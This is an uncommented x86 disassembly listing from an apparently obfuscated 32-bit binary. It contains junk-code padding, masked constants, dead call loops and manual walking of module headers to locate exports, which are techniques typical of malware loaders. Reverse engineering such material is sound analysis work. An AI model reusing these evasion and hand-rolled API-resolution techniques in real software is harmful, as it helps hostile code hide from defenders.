  414f44:	mov    eax,DWORD PTR [eax]
  414f46:	sbb    DWORD PTR ds:0x4377ab,ebx
  414f4c:	mov    ecx,DWORD PTR [ebp-0x14]
  414f4f:	add    eax,DWORD PTR [ecx]
  414f51:	mov    DWORD PTR [ebp-0xc],eax
  414f54:	mov    eax,ds:0x43739f
  414f59:	mov    eax,DWORD PTR [eax+0x198]
  414f5f:	xor    DWORD PTR ds:0x43771b,0x3e1f
  414f69:	mov    ecx,DWORD PTR [ebp+0x8]
  414f6c:	add    DWORD PTR ds:0x437723,0x6248
  414f76:	xor    ecx,0x75108b5
  414f7c:	xor    DWORD PTR ds:0x437747,0x991
  414f86:	add    ecx,0x3272fb
  414f8c:	mov    DWORD PTR ds:0x43774b,0x3d8f
  414f96:	cmp    DWORD PTR [eax],ecx
  414f98:	je     0x414fb2
  414f9e:	mov    DWORD PTR ds:0x437727,0x79bb
  414fa8:	jmp    0x41548c
  414fad:	jmp    0x41548c
  414fb2:	mov    DWORD PTR ds:0x437767,0x75b9
  414fbc:	mov    eax,DWORD PTR [ebp+0x8]
  414fbf:	mov    DWORD PTR ds:0x4377b7,0x4cc7
  414fc9:	cmp    eax,DWORD PTR [ebp+0xc]
  414fcc:	mov    DWORD PTR ds:0x4377ab,0x4de3
  414fd6:	je     0x41548c
  414fdc:	or     ecx,edx
  414fde:	lea    eax,[ebp-0x18]
  414fe1:	mov    DWORD PTR [ebp-0x34],eax
  414fe4:	or     DWORD PTR ds:0x437753,0x437727
  414fee:	mov    eax,DWORD PTR [ebp+0x10]
  414ff1:	mov    edx,DWORD PTR ds:0x437793
  414ff7:	and    DWORD PTR ds:0x437713,edx
  414ffd:	xor    eax,0x75108b5
  415002:	add    eax,0x3272fb
  415007:	mov    ecx,DWORD PTR [ebp-0x34]
  41500a:	mov    DWORD PTR [ecx],eax
  41500c:	mov    eax,DWORD PTR [ebp+0x8]
  41500f:	sbb    ecx,ecx
  415011:	xor    eax,0x75108b5
  415016:	or     ecx,DWORD PTR ds:0x437767
  41501c:	add    eax,0x3272fb
  415021:	mov    ecx,DWORD PTR [ebp+0xc]
  415024:	xor    DWORD PTR ds:0x437767,0x1dfa
  41502e:	xor    ecx,0x75108b5
  415034:	not    DWORD PTR ds:0x437793
  41503a:	add    ecx,0x3272fb
  415040:	mov    edx,DWORD PTR [ebp-0xc]
  415043:	imul   ecx,DWORD PTR [edx]
  415046:	mov    DWORD PTR ds:0x4377a3,0x407a
  415050:	cmp    eax,ecx
  415052:	mov    DWORD PTR ds:0x437747,0x4754
  41505c:	je     0x415286
  415062:	sub    DWORD PTR ds:0x437773,ebx
  415068:	mov    eax,DWORD PTR [ebp-0x14]
  41506b:	inc    ecx
  41506c:	mov    DWORD PTR [ebp-0x4c],eax
  41506f:	mov    eax,DWORD PTR [ebp-0x4c]
  415072:	mov    ecx,DWORD PTR [ebp-0x18]
  415075:	sub    DWORD PTR ds:0x437757,0x437737
  41507f:	add    ecx,DWORD PTR [eax]
  415081:	and    DWORD PTR ds:0x43779f,0x0
  41508b:	xor    eax,eax
  41508d:	xor    eax,DWORD PTR ds:0x43779f
  415093:	inc    eax
  415094:	mov    ds:0x43779f,eax
  415099:	cmp    DWORD PTR ds:0x43779f,0x6
  4150a0:	jl     0x4150e8
  4150a6:	jmp    0x4150c3
  4150ab:	push   0x43772b
  4150b0:	push   0x765e
  4150b5:	push   DWORD PTR [ebp-0x24]
  4150b8:	push   0x1ae5
  4150bd:	call   DWORD PTR ds:0x43c9e4
  4150c3:	cmp    DWORD PTR ds:0x43779f,0x5
  4150ca:	jne    0x4150db
  4150d0:	mov    eax,ds:0x43779f
  4150d5:	inc    eax
  4150d6:	mov    ds:0x43779f,eax
  4150db:	cmp    DWORD PTR ds:0x43779f,0x1c
  4150e2:	jb     0x41508b
  4150e8:	mov    eax,DWORD PTR [ebp-0x4c]
  4150eb:	add    DWORD PTR ds:0x437767,0x43771f
  4150f5:	mov    DWORD PTR [eax],ecx
  4150f7:	adc    DWORD PTR ds:0x43771f,0x57c4
  415101:	mov    eax,DWORD PTR [ebp-0x14]
  415104:	mov    DWORD PTR [ebp-0x50],eax
  415107:	and    DWORD PTR ds:0x43774b,0x0
  415111:	mov    ecx,DWORD PTR ds:0x43774b
  415117:	inc    ecx
  415118:	mov    DWORD PTR ds:0x43774b,ecx
  41511e:	cmp    DWORD PTR ds:0x43774b,0x4
  415125:	jbe    0x415167
  41512b:	jmp    0x415140
  415130:	push   0x437773
  415135:	push   0x69a7
  41513a:	call   DWORD PTR ds:0x43c9e8
  415140:	cmp    DWORD PTR ds:0x43774b,0x3
  415147:	jne    0x41515a
  41514d:	mov    ecx,DWORD PTR ds:0x43774b
  415153:	inc    ecx
  415154:	mov    DWORD PTR ds:0x43774b,ecx
  41515a:	cmp    DWORD PTR ds:0x43774b,0x16
  415161:	jb     0x415111
  415167:	mov    eax,DWORD PTR [ebp+0xc]
  41516a:	xor    eax,0x75108b5
  41516f:	add    eax,0x3272fb
  415174:	and    DWORD PTR ds:0x43774b,0x0
  41517e:	mov    ecx,DWORD PTR ds:0x43774b
  415184:	inc    ecx
  415185:	mov    DWORD PTR ds:0x43774b,ecx
  41518b:	cmp    DWORD PTR ds:0x43774b,0x6
  415192:	jbe    0x4151ec
  415198:	jmp    0x4151c5
  41519d:	push   0x69fb
  4151a2:	push   DWORD PTR [ebp-0x14]
  4151a5:	push   0x4075
  4151aa:	push   0x1f01
  4151af:	push   DWORD PTR [ebp-0x1c]
  4151b2:	push   0x802b
  4151b7:	push   DWORD PTR [ebp-0x28]
  4151ba:	push   0x43700d
  4151bf:	call   DWORD PTR ds:0x43c9ec
  4151c5:	cmp    DWORD PTR ds:0x43774b,0x5
  4151cc:	jne    0x4151df
  4151d2:	mov    ecx,DWORD PTR ds:0x43774b
  4151d8:	inc    ecx
  4151d9:	mov    DWORD PTR ds:0x43774b,ecx
  4151df:	cmp    DWORD PTR ds:0x43774b,0x11
  4151e6:	jb     0x41517e
  4151ec:	mov    ecx,DWORD PTR [ebp-0x50]
  4151ef:	imul   eax,DWORD PTR [ecx]
  4151f2:	sbb    ecx,0xf91
  4151f8:	mov    ecx,DWORD PTR [ebp-0x50]
  4151fb:	mov    DWORD PTR ds:0x437747,0x499d
  415205:	mov    DWORD PTR [ecx],eax
  415207:	mov    eax,DWORD PTR [ebp-0x14]
  41520a:	mov    DWORD PTR ds:0x437777,0x1a
  415214:	cmp    DWORD PTR ds:0x437777,0x0
  41521b:	je     0x415265
  415221:	cmp    DWORD PTR ds:0x437777,0x21
  415228:	jbe    0x415265
  41522e:	jmp    0x415253
  415233:	push   0x3847
  415238:	push   0x437787
  41523d:	push   DWORD PTR [ebp-0x28]
  415240:	push   DWORD PTR [ebp-0x10]
  415243:	push   0x4f57
  415248:	push   0x7258
  41524d:	call   DWORD PTR ds:0x43c9f0
  415253:	mov    ecx,DWORD PTR ds:0x437777
  415259:	dec    ecx
  41525a:	mov    DWORD PTR ds:0x437777,ecx
  415260:	jmp    0x415214
  415265:	mov    DWORD PTR [ebp-0x54],eax
  415268:	mov    eax,DWORD PTR [ebp+0x10]
  41526b:	xor    eax,0x75108b5
  415270:	add    eax,0x3272fb
  415275:	mov    ecx,DWORD PTR [ebp-0x54]
  415278:	mov    ecx,DWORD PTR [ecx]
  41527a:	sub    ecx,eax
  41527c:	mov    eax,DWORD PTR [ebp-0x54]
  41527f:	mov    DWORD PTR [eax],ecx
  415281:	jmp    0x4152b8
  415286:	mov    eax,DWORD PTR [ebp-0x14]
  415289:	mov    DWORD PTR [ebp-0x58],eax
  41528c:	mov    eax,DWORD PTR [ebp+0x14]
  41528f:	mov    ecx,DWORD PTR [ebp-0x58]
  415292:	xor    eax,DWORD PTR [ecx]
  415294:	mov    ecx,DWORD PTR [ebp-0x58]
  415297:	mov    DWORD PTR [ecx],eax
  415299:	mov    eax,DWORD PTR [ebp-0x14]
  41529c:	mov    DWORD PTR [ebp-0x5c],eax
  41529f:	mov    eax,DWORD PTR [ebp+0x10]
  4152a2:	xor    eax,0x75108b5
  4152a7:	add    eax,0x3272fb
  4152ac:	mov    ecx,DWORD PTR [ebp-0x5c]
  4152af:	mov    ecx,DWORD PTR [ecx]
  4152b1:	sub    ecx,eax
  4152b3:	mov    eax,DWORD PTR [ebp-0x5c]
  4152b6:	mov    DWORD PTR [eax],ecx
  4152b8:	mov    eax,DWORD PTR [ebp-0x14]
  4152bb:	mov    ecx,DWORD PTR [ebp-0xc]
  4152be:	add    ecx,DWORD PTR [eax]
  4152c0:	mov    DWORD PTR [ebp-0xc],ecx
  4152c3:	mov    eax,DWORD PTR [ebp+0xc]
  4152c6:	xor    eax,0x75108b5
  4152cb:	add    eax,0x3272fb
  4152d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4152d3:	xor    ecx,0x75108b5
  4152d9:	mov    edx,DWORD PTR [ebp+0xc]
  4152dc:	xor    edx,0x75108b5
  4152e2:	lea    ecx,[ecx+edx*1+0x64e5f6]
  4152e9:	mov    edx,DWORD PTR [ebp+0xc]
  4152ec:	xor    edx,0x75108b5
  4152f2:	add    edx,0x3272fb
  4152f8:	imul   ecx,edx
  4152fb:	sub    eax,ecx
  4152fd:	mov    ecx,DWORD PTR [ebp-0x14]
  415300:	cmp    DWORD PTR [ecx],eax
  415302:	jg     0x41532c
  415308:	mov    eax,DWORD PTR [ebp-0x14]
  41530b:	mov    DWORD PTR [ebp-0x60],eax
  41530e:	mov    eax,DWORD PTR [ebp+0x10]
  415311:	xor    eax,0x75108b5
  415316:	add    eax,0x3272fb
  41531b:	mov    ecx,DWORD PTR [ebp-0x60]
  41531e:	mov    ecx,DWORD PTR [ecx]
  415320:	sub    ecx,eax
  415322:	mov    eax,DWORD PTR [ebp-0x60]
  415325:	mov    DWORD PTR [eax],ecx
  415327:	jmp    0x41534b
  41532c:	mov    eax,DWORD PTR [ebp-0x14]
  41532f:	mov    DWORD PTR [ebp-0x64],eax
  415332:	mov    eax,DWORD PTR [ebp+0x10]
  415335:	xor    eax,0x75108b5
  41533a:	mov    ecx,DWORD PTR [ebp-0x64]
  41533d:	mov    ecx,DWORD PTR [ecx]
  41533f:	lea    eax,[eax+ecx*1+0x3272fb]
  415346:	mov    ecx,DWORD PTR [ebp-0x64]
  415349:	mov    DWORD PTR [ecx],eax
  41534b:	mov    eax,DWORD PTR [ebp-0xc]
  41534e:	mov    eax,DWORD PTR [eax]
  415350:	mov    DWORD PTR [ebp-0x2c],eax
  415353:	mov    eax,DWORD PTR [ebp-0x8]
  415356:	xor    eax,0x75108b5
  41535b:	add    eax,0x3272fa
  415360:	not    eax
  415362:	and    eax,DWORD PTR [ebp-0x2c]
  415365:	mov    DWORD PTR [ebp-0x2c],eax
  415368:	lea    eax,[ebp-0x20]
  41536b:	mov    DWORD PTR [ebp-0x38],eax
  41536e:	mov    eax,DWORD PTR [ebp-0x38]
  415371:	mov    DWORD PTR [eax],0x7097b85d
  415377:	mov    DWORD PTR [eax+0x4],0xffffffff
  41537e:	lea    eax,[ebp-0x28]
  415381:	mov    DWORD PTR [ebp-0x30],eax
  415384:	mov    eax,DWORD PTR [ebp-0x30]
  415387:	mov    DWORD PTR [eax],0x7097a55f
  41538d:	mov    DWORD PTR [eax+0x4],0xffffffff
  415394:	mov    eax,DWORD PTR [ebp-0x2c]
  415397:	movzx  eax,WORD PTR [eax]
  41539a:	mov    ecx,DWORD PTR [ebp-0x20]
  41539d:	mov    edx,DWORD PTR [ebp-0x1c]
  4153a0:	xor    ecx,0x8a29a14b
  4153a6:	xor    edx,0x0
  4153a9:	add    ecx,0x5424137
  4153af:	adc    edx,0x0
  4153b2:	movzx  ecx,cx
  4153b5:	cmp    eax,ecx
  4153b7:	je     0x4153dc
  4153bd:	mov    eax,DWORD PTR [ebp-0x8]
  4153c0:	xor    eax,0x75108b5
  4153c5:	add    eax,0x3272fb
  4153ca:	mov    ecx,DWORD PTR [ebp-0x2c]
  4153cd:	sub    ecx,eax
  4153cf:	mov    DWORD PTR [ebp-0x2c],ecx
  4153d2:	jmp    0x415368
  4153d7:	jmp    0x41548c
  4153dc:	lea    eax,[ebp-0x44]
  4153df:	mov    DWORD PTR [ebp-0x40],eax
  4153e2:	mov    eax,DWORD PTR [ebp-0x2c]
  4153e5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4153e8:	add    ecx,DWORD PTR [eax+0x3c]
  4153eb:	mov    eax,DWORD PTR [ebp-0x10]
  4153ee:	mov    eax,DWORD PTR [eax]
  4153f0:	mov    edx,DWORD PTR [ebp-0x40]
  4153f3:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4153f7:	mov    DWORD PTR [edx],eax
  4153f9:	lea    eax,[ebp-0x3c]
  4153fc:	mov    DWORD PTR [ebp-0x48],eax
  4153ff:	mov    eax,DWORD PTR [ebp+0x8]
  415402:	xor    eax,0x75108b5
  415407:	add    eax,0x3272fb
  41540c:	mov    ecx,DWORD PTR [ebp-0x48]
  41540f:	mov    DWORD PTR [ecx],eax
  415411:	mov    eax,DWORD PTR [ebp-0x44]
  415414:	mov    ecx,DWORD PTR [ebp+0x8]
  415417:	xor    ecx,0x75108b5
  41541d:	add    ecx,0x3272fb
  415423:	cmp    eax,ecx
  415425:	je     0x41547b
  41542b:	mov    eax,DWORD PTR [ebp-0x2c]
  41542e:	add    eax,DWORD PTR [ebp-0x44]
  415431:	mov    ecx,DWORD PTR [ebp-0x48]
  415434:	mov    DWORD PTR [ecx],eax
  415436:	mov    eax,DWORD PTR [ebp-0x3c]
  415439:	mov    eax,DWORD PTR [eax+0xc]
  41543c:	mov    ecx,DWORD PTR [ebp-0x2c]
  41543f:	movzx  eax,WORD PTR [ecx+eax*1]
  415443:	mov    ecx,DWORD PTR [ebp-0x28]
  415446:	mov    edx,DWORD PTR [ebp-0x24]
  415449:	xor    ecx,0x8a29a14b
  41544f:	xor    edx,0x0
  415452:	add    ecx,0x5424137
  415458:	adc    edx,0x0
  41545b:	movzx  ecx,cx
  41545e:	cmp    eax,ecx
  415460:	jne    0x41547b
  415466:	mov    eax,ds:0x43739f
  41546b:	mov    eax,DWORD PTR [eax+0x198]
  415471:	mov    ecx,DWORD PTR [ebp-0x2c]
  415474:	mov    DWORD PTR [eax],ecx
  415476:	jmp    0x41548c
  41547b:	push   DWORD PTR [ebp+0x14]
  41547e:	push   DWORD PTR [ebp+0x10]
  415481:	push   DWORD PTR [ebp+0xc]
  415484:	push   DWORD PTR [ebp+0x8]
  415487:	call   0x414de4
  41548c:	leave  
  41548d:	ret    0x10
  415490:	push   ebp
  415491:	mov    ebp,esp
  415493:	push   ecx
  415494:	or     DWORD PTR ds:0x437737,0x437717
  41549e:	push   ecx
  41549f:	sub    DWORD PTR ds:0x437757,ebx
  4154a5:	lea    eax,[ebp-0x8]
  4154a8:	adc    ecx,DWORD PTR ds:0x43778b
  4154ae:	mov    DWORD PTR [ebp-0x4],eax
  4154b1:	mov    eax,ds:0x43775b
  4154b6:	xor    DWORD PTR ds:0x43777f,eax
  4154bc:	mov    eax,DWORD PTR [ebp-0x8]
  4154bf:	and    ecx,DWORD PTR ds:0x43776f
  4154c5:	mov    ecx,DWORD PTR [ebp-0x4]
  4154c8:	mov    ecx,DWORD PTR [ecx]
  4154ca:	sub    eax,ecx
  4154cc:	mov    DWORD PTR [ebp-0x8],eax
  4154cf:	or     DWORD PTR ds:0x437733,0x437787
  4154d9:	xor    eax,eax
  4154db:	and    DWORD PTR ds:0x437747,0x0
  4154e5:	xor    ecx,ecx
  4154e7:	or     ecx,DWORD PTR ds:0x437747
  4154ed:	inc    ecx
  4154ee:	mov    DWORD PTR ds:0x437747,ecx
  4154f4:	cmp    DWORD PTR ds:0x437747,0x1d
  4154fb:	jbe    0x41552d
  415501:	jmp    0x415520
  415506:	push   0x43772f
  41550b:	push   0x43773f
  415510:	push   0x7558
  415515:	push   0x4370a4
  41551a:	call   DWORD PTR ds:0x43c9f4
  415520:	cmp    DWORD PTR ds:0x437747,0x1c
  415527:	jb     0x4154e5
  41552d:	mov    eax,DWORD PTR [ebp-0x4]
  415530:	not    DWORD PTR ds:0x43778f
  415536:	mov    eax,DWORD PTR [eax]
  415538:	and    DWORD PTR ds:0x437767,0x0
  415542:	mov    ecx,DWORD PTR ds:0x437767
  415548:	inc    ecx
  415549:	mov    DWORD PTR ds:0x437767,ecx
  41554f:	cmp    DWORD PTR ds:0x437767,0x7
  415556:	jb     0x41559b
  41555c:	jmp    0x415574
  415561:	push   0x437767
  415566:	push   0x437733
  41556b:	push   DWORD PTR [ebp-0x28]
  41556e:	call   DWORD PTR ds:0x43c9f8
  415574:	cmp    DWORD PTR ds:0x437767,0x6
  41557b:	jne    0x41558e
  415581:	mov    ecx,DWORD PTR ds:0x437767
  415587:	inc    ecx
  415588:	mov    DWORD PTR ds:0x437767,ecx
  41558e:	cmp    DWORD PTR ds:0x437767,0x12
  415595:	jb     0x415542
  41559b:	xor    eax,0xf89c85bc
  4155a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4155a3:	mov    DWORD PTR [ecx],eax
  4155a5:	mov    eax,DWORD PTR [ebp+0xc]
  4155a8:	xor    eax,0x75108b5
  4155ad:	add    eax,0x3272fb
  4155b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4155b5:	mov    DWORD PTR [ecx+0x4],eax
  4155b8:	mov    eax,DWORD PTR [ebp+0x14]
  4155bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4155be:	mov    DWORD PTR [ecx+0x8],eax
  4155c1:	mov    eax,DWORD PTR [ebp+0x18]
  4155c4:	mov    ecx,DWORD PTR [ebp+0x10]
  4155c7:	mov    DWORD PTR [ecx+0xc],eax
  4155ca:	mov    eax,DWORD PTR [ebp+0x1c]
  4155cd:	mov    ecx,DWORD PTR [ebp+0x10]
  4155d0:	mov    DWORD PTR [ecx+0x10],eax
  4155d3:	mov    eax,DWORD PTR [ebp-0x8]
  4155d6:	xor    eax,0x75108b5
  4155db:	add    eax,0x3272fb
  4155e0:	mov    ecx,DWORD PTR [ebp+0x10]
  4155e3:	mov    DWORD PTR [ecx],eax
  4155e5:	mov    eax,DWORD PTR [ebp+0x8]
  4155e8:	xor    eax,0x75108b5
  4155ed:	add    eax,0x3272fb
  4155f2:	leave  
  4155f3:	ret    0x18
  4155f6:	push   ebp
  4155f7:	mov    ebp,esp
  4155f9:	sub    esp,0x1ac
  4155ff:	add    eax,DWORD PTR ds:0x4377a7
  415605:	push   esi
  415606:	add    DWORD PTR ds:0x43771b,0x43779b
  415610:	mov    eax,DWORD PTR [ebp+0x8]
  415613:	xor    eax,0x75108b5
  415618:	add    eax,0x3272fb
  41561d:	xor    DWORD PTR ds:0x43777f,0x43779f
  415627:	mov    DWORD PTR [ebp-0x20],eax
  41562a:	movzx  eax,BYTE PTR ds:0x437797
  415631:	adc    eax,DWORD PTR ds:0x4377a3
  415637:	mov    ds:0x437797,eax
  41563c:	mov    eax,ds:0x43721f
  415641:	mov    eax,DWORD PTR [eax]
  415643:	xor    DWORD PTR ds:0x437787,0xb5b
  41564d:	mov    DWORD PTR [ebp-0x10],eax
  415650:	movzx  eax,BYTE PTR ds:0x4377a7
  415657:	and    eax,DWORD PTR ds:0x437793
  41565d:	mov    ds:0x4377a7,eax
  415662:	mov    eax,ds:0x43742f
  415667:	mov    eax,DWORD PTR [eax]
  415669:	mov    DWORD PTR [ebp-0x14],eax
  41566c:	inc    eax
  41566d:	mov    eax,DWORD PTR [ebp-0x10]
  415670:	and    DWORD PTR ds:0x4377a3,0x4377b3
  41567a:	xor    ecx,ecx
  41567c:	sub    eax,0x5424137
  415681:	mov    DWORD PTR ds:0x43779b,0x4f0f
  41568b:	sbb    ecx,0x0
  41568e:	xor    eax,0x8a29a14b
  415693:	sub    DWORD PTR ds:0x43772f,0x7a71
  41569d:	xor    ecx,0x0
  4156a0:	mov    DWORD PTR [ebp-0x1a4],eax
  4156a6:	mov    DWORD PTR ds:0x43777b,0x4c82
  4156b0:	mov    DWORD PTR [ebp-0x1a0],ecx
  4156b6:	mov    DWORD PTR ds:0x437793,0x4615
  4156c0:	cmp    DWORD PTR [ebp-0x1a4],0x70941f82
  4156ca:	jne    0x4156f1
  4156d0:	mov    DWORD PTR ds:0x43776f,0x15aa
  4156da:	cmp    DWORD PTR [ebp-0x1a0],0xffffffff
  4156e1:	mov    DWORD PTR ds:0x437733,0x56fb
  4156eb:	je     0x415a9e
  4156f1:	and    DWORD PTR ds:0x437767,0x0
  4156fb:	jmp    0x41570b
  415700:	mov    eax,ds:0x437767
  415705:	inc    eax
  415706:	mov    ds:0x437767,eax
  41570b:	cmp    DWORD PTR ds:0x437767,0x14
  415712:	jae    0x415748
  415718:	cmp    DWORD PTR ds:0x437767,0x1f
  41571f:	jge    0x415748
  415725:	jmp    0x415743
  41572a:	push   0x3245
  41572f:	push   DWORD PTR [ebp-0xc]
  415732:	push   DWORD PTR [ebp-0x20]
  415735:	push   0x2d62
  41573a:	push   DWORD PTR [ebp-0x1c]
  41573d:	call   DWORD PTR ds:0x43c9fc
  415743:	jmp    0x415700
  415748:	mov    eax,DWORD PTR [ebp-0x14]
  41574b:	sub    DWORD PTR ds:0x437753,0x4f0
  415755:	xor    ecx,ecx
  415757:	xor    DWORD PTR ds:0x437777,0x1d12
  415761:	sub    eax,0x5424137
  415766:	mov    DWORD PTR ds:0x437777,0x6f96
  415770:	sbb    ecx,0x0
  415773:	xor    eax,0x8a29a14b
  415778:	xor    ecx,0x0
  41577b:	mov    DWORD PTR [ebp-0x1ac],eax
  415781:	mov    DWORD PTR ds:0x43775b,0x49f3
  41578b:	mov    DWORD PTR [ebp-0x1a8],ecx
  415791:	cmp    DWORD PTR [ebp-0x1ac],0x70941f82
  41579b:	mov    DWORD PTR ds:0x437773,0xfeb
  4157a5:	jne    0x4157c2
  4157ab:	mov    DWORD PTR ds:0x43773f,0x71a9
  4157b5:	cmp    DWORD PTR [ebp-0x1a8],0xffffffff
  4157bc:	je     0x415a9e
  4157c2:	dec    eax
  4157c3:	mov    eax,DWORD PTR [ebp+0x10]
  4157c6:	xor    ecx,ecx
  4157c8:	or     ecx,DWORD PTR ds:0x43776b
  4157ce:	sbb    ecx,DWORD PTR ds:0x43772f
  4157d4:	mov    DWORD PTR ds:0x43776b,ecx
  4157da:	xor    eax,0x75108b5
  4157df:	xor    ecx,ecx
  4157e1:	or     ecx,DWORD PTR ds:0x4384a7
  4157e7:	mov    ecx,DWORD PTR [ecx]
  4157e9:	and    DWORD PTR ds:0x43772f,ecx
  4157ef:	add    eax,0x3272fb
  4157f4:	xor    ecx,DWORD PTR ds:0x43779f
  4157fa:	mov    DWORD PTR [ebp-0x1c],eax
  4157fd:	mov    DWORD PTR ds:0x437727,0x14
  415807:	cmp    DWORD PTR ds:0x437727,0x0
  41580e:	je     0x415862
  415814:	cmp    DWORD PTR ds:0x437727,0x5
  41581b:	ja     0x415862
  415821:	jmp    0x41583a
  415826:	push   DWORD PTR [ebp-0x28]
  415829:	push   DWORD PTR [ebp-0x14]
  41582c:	push   0x4370f4
  415831:	push   DWORD PTR [ebp-0x18]
  415834:	call   DWORD PTR ds:0x43ca00
  41583a:	cmp    DWORD PTR ds:0x437727,0x6
  415841:	jne    0x415852
  415847:	mov    eax,ds:0x437727
  41584c:	dec    eax
  41584d:	mov    ds:0x437727,eax
  415852:	mov    eax,ds:0x437727
  415857:	dec    eax
  415858:	mov    ds:0x437727,eax
  41585d:	jmp    0x415807
  415862:	mov    eax,ds:0x43739f
  415867:	mov    DWORD PTR [ebp-0x18],eax
  41586a:	movzx  ecx,BYTE PTR ds:0x43770f
  415871:	xor    DWORD PTR ds:0x43775b,ecx
  415877:	mov    eax,DWORD PTR [ebp-0x10]
  41587a:	and    DWORD PTR ds:0x4377b3,0x0
  415884:	jmp    0x415896
  415889:	mov    ecx,DWORD PTR ds:0x4377b3
  41588f:	inc    ecx
  415890:	mov    DWORD PTR ds:0x4377b3,ecx
  415896:	cmp    DWORD PTR ds:0x4377b3,0x1b
  41589d:	jae    0x4158c5
  4158a3:	cmp    DWORD PTR ds:0x4377b3,0x21
  4158aa:	jb     0x4158c5
  4158b0:	jmp    0x4158c0
  4158b5:	push   0x6097
  4158ba:	call   DWORD PTR ds:0x43ca04
  4158c0:	jmp    0x415889
  4158c5:	mov    DWORD PTR [ebp-0x24],eax
  4158c8:	mov    eax,DWORD PTR [ebp-0x14]
  4158cb:	add    eax,0x4
  4158ce:	mov    ecx,DWORD PTR [ebp-0x24]
  4158d1:	sub    DWORD PTR ds:0x43771f,0x631a
  4158db:	sub    eax,ecx
  4158dd:	mov    DWORD PTR [ebp-0x4],eax
  4158e0:	xor    eax,0x956
  4158e5:	mov    DWORD PTR [ebp-0x78],0xf89c85bc
  4158ec:	xor    eax,DWORD PTR ds:0x43775f
  4158f2:	mov    eax,DWORD PTR [ebp-0x24]
  4158f5:	mov    DWORD PTR [ebp-0x74],eax
  4158f8:	mov    DWORD PTR ds:0x437723,0x1a
  415902:	cmp    DWORD PTR ds:0x437723,0x0
  415909:	je     0x415955
  41590f:	cmp    DWORD PTR ds:0x437723,0xa
  415916:	jle    0x415955
  41591c:	jmp    0x41592d
  415921:	push   DWORD PTR [ebp-0x1c]
  415924:	push   DWORD PTR [ebp-0x1c]
  415927:	call   DWORD PTR ds:0x43ca08
  41592d:	cmp    DWORD PTR ds:0x437723,0xb
  415934:	jne    0x415945
  41593a:	mov    eax,ds:0x437723
  41593f:	dec    eax
  415940:	mov    ds:0x437723,eax
  415945:	mov    eax,ds:0x437723
  41594a:	dec    eax
  41594b:	mov    ds:0x437723,eax
  415950:	jmp    0x415902
  415955:	mov    eax,DWORD PTR [ebp-0x4]
  415958:	or     DWORD PTR ds:0x43774f,0x437717
  415962:	mov    DWORD PTR [ebp-0x70],eax
  415965:	xor    DWORD PTR ds:0x43771f,ebx
  41596b:	mov    eax,DWORD PTR [ebp+0x14]
  41596e:	xor    DWORD PTR ds:0x437713,0x4377af
  415978:	xor    eax,0x75108b5
  41597d:	xor    DWORD PTR ds:0x43770f,0x6763
  415987:	add    eax,0x3272fb
  41598c:	add    DWORD PTR ds:0x4377bb,0x6c9b
  415996:	mov    DWORD PTR [ebp-0x6c],eax
  415999:	sub    DWORD PTR ds:0x437723,0x4377af
  4159a3:	lea    eax,[ebp-0xc]
  4159a6:	not    DWORD PTR ds:0x43777b
  4159ac:	mov    DWORD PTR [ebp-0x68],eax
  4159af:	neg    DWORD PTR ds:0x43772f
  4159b5:	mov    eax,DWORD PTR [ebp-0x78]
  4159b8:	xor    DWORD PTR ds:0x437787,0x23e8
  4159c2:	xor    eax,0x75108b5
  4159c7:	sub    DWORD PTR ds:0x4377b3,0x919
  4159d1:	add    eax,0x3272fb
  4159d6:	mov    DWORD PTR [ebp-0x78],eax
  4159d9:	adc    DWORD PTR ds:0x4377af,0x561d
  4159e3:	lea    eax,[ebp-0x78]
  4159e6:	sub    DWORD PTR ds:0x43776b,0x437783
  4159f0:	push   eax
  4159f1:	mov    eax,ds:0x437787
  4159f6:	adc    DWORD PTR ds:0x43774f,eax
  4159fc:	mov    eax,DWORD PTR [ebp+0xc]
  4159ff:	or     DWORD PTR ds:0x4377a7,0x409b
  415a09:	xor    eax,0x75108b5
  415a0e:	or     DWORD PTR ds:0x437763,0x48d4
  415a18:	add    eax,0x3272fb
  415a1d:	xor    DWORD PTR ds:0x437737,0x4377bb
  415a27:	push   eax
  415a28:	mov    DWORD PTR ds:0x43770f,0x1d
  415a32:	cmp    DWORD PTR ds:0x43770f,0x0
  415a39:	je     0x415a79
  415a3f:	cmp    DWORD PTR ds:0x43770f,0x22
  415a46:	jle    0x415a79
  415a4c:	jmp    0x415a69
  415a51:	push   0x5a7a
  415a56:	push   DWORD PTR [ebp-0xc]
  415a59:	push   0x437773
  415a5e:	push   0x43774b
  415a63:	call   DWORD PTR ds:0x43ca0c
  415a69:	mov    eax,ds:0x43770f
  415a6e:	dec    eax
  415a6f:	mov    ds:0x43770f,eax
  415a74:	jmp    0x415a32
  415a79:	push   0x437315
  415a7e:	mov    eax,ds:0x4373bf
  415a83:	adc    DWORD PTR ds:0x43779f,0x43778f
  415a8d:	push   DWORD PTR [eax]
  415a8f:	sbb    DWORD PTR ds:0x43771b,0x437783
  415a99:	call   0x40d347
  415a9e:	mov    eax,DWORD PTR [ebp-0x24]
  415aa1:	or     DWORD PTR ds:0x43776f,0x10e2
  415aab:	mov    DWORD PTR [ebp-0x8],eax
  415aae:	mov    eax,DWORD PTR [ebp-0x4]
  415ab1:	add    DWORD PTR ds:0x437753,0x43776f
  415abb:	mov    DWORD PTR [ebp-0x2c],eax
  415abe:	sub    DWORD PTR ds:0x43776f,ebx
  415ac4:	mov    eax,DWORD PTR [ebp-0x8]
  415ac7:	sub    eax,0x3272fb
  415acc:	xor    eax,0x75108b5
  415ad1:	cmp    eax,0xf89c85b0
  415ad6:	jne    0x415ae9
  415adc:	dec    DWORD PTR ds:0x4377af
  415ae2:	xor    eax,eax
  415ae4:	jmp    0x42d445
  415ae9:	xor    eax,eax
  415aeb:	add    eax,DWORD PTR ds:0x43774f
  415af1:	and    DWORD PTR ds:0x43775f,eax
  415af7:	mov    eax,DWORD PTR [ebp-0x2c]
  415afa:	and    DWORD PTR ds:0x437717,0x0
  415b04:	jmp    0x415b16
  415b09:	mov    ecx,DWORD PTR ds:0x437717
  415b0f:	inc    ecx
  415b10:	mov    DWORD PTR ds:0x437717,ecx
  415b16:	cmp    DWORD PTR ds:0x437717,0x10
  415b1d:	jae    0x415b70
  415b23:	cmp    DWORD PTR ds:0x437717,0x6
  415b2a:	jle    0x415b70
  415b30:	jmp    0x415b51
